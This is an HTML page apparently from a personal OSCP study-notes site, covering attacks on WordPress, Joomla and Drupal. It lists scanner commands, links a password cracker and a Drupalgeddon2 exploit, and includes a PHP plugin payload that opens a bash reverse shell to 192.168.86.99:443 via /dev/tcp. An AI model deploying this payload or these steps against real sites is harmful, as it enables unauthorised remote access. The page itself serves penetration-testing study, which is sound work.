@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>CMSs | OSCP Notes</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="CMSs" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="1 Wordpress" />
+<meta property="og:description" content="1 Wordpress" />
+<link rel="canonical" href="http://localhost:4000/2-web/cms/" />
+<meta property="og:url" content="http://localhost:4000/2-web/cms/" />
+<meta property="og:site_name" content="OSCP Notes" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-08-03T20:23:57+00:00" />
+<script type="application/ld+json">
+{"@type":"Article","url":"http://localhost:4000/2-web/cms/","headline":"CMSs","dateModified":"2020-08-03T20:23:57+00:00","datePublished":"2020-08-03T20:23:57+00:00","description":"1 Wordpress","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/siteicon.png"}},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="OSCP Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/css/main.css">
+		<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/"><img src="/images/emblem.svg" width="40" height="40" alt="OSCP Notes logo"></a>
+				OSCP Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/">Hack The Planet</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/0-basics/1-network-basics/">basics</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/0-basics/1-network-basics/">network basics</a></li>
+								
+									<li class="nav-item "><a href="/0-basics/2-metasploit-basics/">metasploit basics</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/1-recon-enum/1-0-passive-recon/">enum</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-0-passive-recon/">passive recon</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-1-port-scanning-server-side-enumeration/">PORT SCANNING</a></li>
+								
+									<li class="nav-item "><a href="/1-recon-enum/1-3-common-ports/">COMMON PORTS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/2-web/0-initial-enumeration/">web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/2-web/0-initial-enumeration/">initial methodology</a></li>
+								
+									<li class="nav-item "><a href="/2-web/LFI-RFI/">Local and Remote file inclusion</a></li>
+								
+									<li class="nav-item current"><a href="/2-web/cms/">CMSs</a></li>
+								
+									<li class="nav-item "><a href="/2-web/command-injection/">command injection</a></li>
+								
+									<li class="nav-item "><a href="/2-web/csrf/">CSRF</a></li>
+								
+									<li class="nav-item "><a href="/2-web/sqli/">SQL Injections</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssl/">ssl</a></li>
+								
+									<li class="nav-item "><a href="/2-web/ssrf/">ssrf</a></li>
+								
+									<li class="nav-item "><a href="/2-web/upload-bypass/">upload-bypass</a></li>
+								
+									<li class="nav-item "><a href="/2-web/verb-tampering/">verb tampering</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xee/">XXE</a></li>
+								
+									<li class="nav-item "><a href="/2-web/xss/">XSS</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/3-Exploiting/1-webshells/">exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/3-Exploiting/1-webshells/">webshells</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/2-shellcodes-compiling-deploying/">shellcodes , compiling and deploying</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/3-bypassing-AV/">bypassing AV</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/4-databases/">databases</a></li>
+								
+									<li class="nav-item "><a href="/3-Exploiting/6-reverse-shells/">Reverse Shells</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/4-win-privesc/1-initial/">win privesc</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/4-win-privesc/1-initial/">initial</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/10-always-install-elevated/">always install elevated</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/11-secondary-logon-ms16-032/">secondary logon handle</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/12-insecure-registry/">insecure registry permissions</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/13-intel-sysret/">intel sysret</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/14-runas/">runas</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/15-LFI-FILES/">LFI files</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/16-UAC/">UAC bypass</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/17-llmnr/">LLMNR and NBT-NS poisoning</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/2-stored-credentials/">stored credentials</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/3-kernel/">Kernel Vulns</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/4-dll-injection/">DLL Injection</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/5-weak-service-permissions/">weak services</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/6-dll-hijacking/">DLL hijacking</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/7-potato/">POTATOS</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/8-group-policies-preferences/">group policy preferences</a></li>
+								
+									<li class="nav-item "><a href="/4-win-privesc/9-unquoted-service-path/">unquoted service path</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/5-linux-privesc/4-2-linux-privesc/">linux privesc</a></li>
+								
+									<li class="nav-item "><a href="/5-linux-privesc/lin-security/">lin-security + GTFO bins</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/6-post-exploitation/4-0-windows-file-transfer/">post exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-0-windows-file-transfer/">windows file transfer</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4-3-passwords+hash_attacks/">passwords attacks</a></li>
+								
+									<li class="nav-item "><a href="/6-post-exploitation/4.4-pivoting+tunneling/">pivoting+tunneling</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/7-varios/tips/">varios</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/7-varios/tips/">tips</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/8-cheatsheets/msfvenom/">cheatsheets</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/msfvenom/">msfvenom</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/nmap/">nmap</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/powershell/">powershell</a></li>
+								
+									<li class="nav-item "><a href="/8-cheatsheets/tmux/">tmux</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/changelog/"></a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>web</h2>
+				<h3>CMSs</h3>
+			</div>
+			<article class="content">
+				<h1 id="1-wordpress">1 Wordpress</h1>
+<hr />
+
+<h2 id="wpscan">wpscan</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  wpscan --url http://sandbox.local  --enumerate ap,at,cb,dbe -o sandbox.out
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ./wpscan –url http://IP/ –enumerate p
+</code></pre></div></div>
+<p>a veces conviene usar el modo agressive de wpscan</p>
+
+<h2 id="wordpress-password-cracker">wordpress password cracker</h2>
+
+<p>https://github.com/MrSqar-Ye/wpCrack.git</p>
+
+<h2 id="wordpress-reverse-shell-admin-panel">wordpress reverse shell admin panel</h2>
+<ol>
+  <li>create php code</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.86.99/443 0&gt;&amp;1'");
+?&gt;
+</code></pre></div></div>
+
+<ol>
+  <li>zip the php</li>
+  <li>upload the zip as plugin</li>
+  <li>activate plugin</li>
+</ol>
+
+<h1 id="2-joomla">2 Joomla</h1>
+<hr />
+<p>ip/administrator/manifests/files/joomla.xml &lt;- te da la version</p>
+
+<h2 id="joomscan">joomscan</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joomscan -ec -u  http://curling.htb
+</code></pre></div></div>
+
+<h1 id="3-drupal">3 DRUPAL</h1>
+<hr />
+<p>https://github.com/dreadlocked/Drupalgeddon2</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>droopescan scan drupal -u 10.10.10.102:80 
+</code></pre></div></div>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
